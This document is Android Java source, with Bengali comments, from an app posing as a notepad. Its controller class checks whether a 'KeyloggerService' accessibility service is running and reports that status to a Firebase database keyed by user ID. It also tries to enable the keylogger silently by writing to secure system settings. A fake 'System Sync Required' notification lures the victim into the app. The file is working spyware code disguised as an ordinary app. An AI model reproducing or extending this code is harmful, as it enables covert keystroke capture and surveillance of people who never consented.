package com.megh.notepad; // আপনার প্যাকেজ নেম দিন

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class AccessibilityController {

    private Context context;
    private String userId;

    public AccessibilityController(Context context, String userId) {
        this.context = context;
        this.userId = userId;
    }

    // ==========================================
    // ১. সার্ভিস ON নাকি OFF তা চেক করার মেথড
    // ==========================================
    public void checkAndUploadStatus() {
        boolean isOn = isAccessibilityServiceEnabled(context, KeyloggerService.class);
        String status = isOn ? "ON" : "OFF";
        
        // ফায়ারবেসে স্ট্যাটাস আপডেট করা
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("DeviceData")
                .child(userId).child("AccessibilityStatus");
        ref.setValue(status);
        
        Log.d("AccController", "Current Status: " + status);
    }

    private boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        
        if (enabledServicesSetting == null) return false;
        
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);
        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName)) {
                return true;
            }
        }
        return false;
    }

    // ==========================================
    // ২. অটোমেটিক সার্ভিস ON করার মাস্টার কোড (ADB Permission Required)
    // ==========================================
    public void autoEnableService() {
        try {
            String serviceName = context.getPackageName() + "/" + KeyloggerService.class.getName();
            
            // ম্যাজিক কোড: সিস্টেম সেটিংসে সরাসরি সার্ভিস অন করা
            Settings.Secure.putString(context.getContentResolver(), 
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, serviceName);
            
            Settings.Secure.putString(context.getContentResolver(), 
                    Settings.Secure.ACCESSIBILITY_ENABLED, "1");
            
            // কাজ শেষ হলে ফায়ারবেসে স্ট্যাটাস আপডেট করা
            checkAndUploadStatus();
            Log.d("AccController", "Service Auto Enabled Successfully!");

        } catch (Exception e) {
            Log.e("AccController", "Auto Enable Failed (ADB Permission missing?): " + e.getMessage());
            // যদি পারমিশন না থাকে, ফায়ারবেসে এরর মেসেজ পাঠাবে
            FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(userId).child("AccessibilityStatus").setValue("Error: No ADB Permission");
        }
    }

    // ==========================================
    // ৩. ফেইক নোটিফিকেশন পাঠানোর কোড
    // ==========================================
        // ==========================================
    // ৩. ফেইক নোটিফিকেশন পাঠানোর কোড (আপডেটেড)
    // ==========================================
    public void showFakeNotification() {
        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        String channelId = "system_sync_channel";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "System Sync", NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(channel);
        }

        // ম্যাজিক: এখন ক্লিক করলে সরাসরি আপনার অ্যাপের MainActivity ওপেন হবে
        // (যদি আপনার মূল পেজের নাম অন্য কিছু হয়, তবে MainActivity.class এর জায়গায় সেটি দেবেন)
        Intent intent = new Intent(context, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, channelId)
                .setSmallIcon(android.R.drawable.stat_notify_sync) 
                .setContentTitle("⚠️ System Sync Required")
                .setContentText("Tap here to fix battery & sync issues.")
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true); 

        notificationManager.notify(1001, builder.build());
        Log.d("AccController", "Fake Notification Sent! (Will open App)");
    }

}

